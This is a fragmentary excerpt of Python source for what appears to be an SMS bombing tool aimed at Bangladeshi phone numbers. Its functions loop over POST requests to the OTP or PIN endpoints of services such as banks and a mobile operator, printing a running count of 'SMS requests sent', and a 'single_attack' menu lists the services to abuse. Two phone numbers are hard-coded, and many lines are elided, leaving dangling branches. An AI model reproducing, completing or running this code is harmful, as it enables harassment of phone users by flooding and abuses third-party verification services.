...
def sent_pin(number, amount):
    ...
    siamclr(bombInfo)
    i = 0
    siamclr(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    if len(myAtt) == 12:
        numberTwo = myAtt
    else:
        numberTwo = number
...
def my_robi(number,amount,oparetor):
    ...
    siamclr(bombInfo)
    i = 0
    siamclr(f"   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        try:
            ...
            if number in ['01843448308', '01832116637']:
                ...
                while i < amount:
                    try:
                        ...
                        data_1 = "mobile=" + number + "&prefix=00880"
                        resp_1 = requests.post(url_1, headers=headers_1, data=data_1)
                        siamclr(json.dumps(json.loads(resp_1.text), indent=1))
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
                    ...
                    try:
                        ...
                        siamclr(json.dumps(json.loads(resp_2.text), indent=1))
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
                    ...
                    try:
                        ...
                        siamclr(json.dumps(json.loads(resp_3.text), indent=1))
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
                    ...
                    try:
                        ...
                        siamclr(json.dumps(json.loads(resp_4.text), indent=1))
                        time.sleep(480)
                        if i == amount:
                            break
                        else:
...
def single_attack():
    option_single = siamclr(f'''{random.choice(colorArr)}
    [1] PADMA BANK
    [2] BD FINANCE
    [3] UPAI 
    [4] MADICO
...
def madico(number):
    try:
        while True:
            ...
            siamclr(requ_sahjalal_server.text)
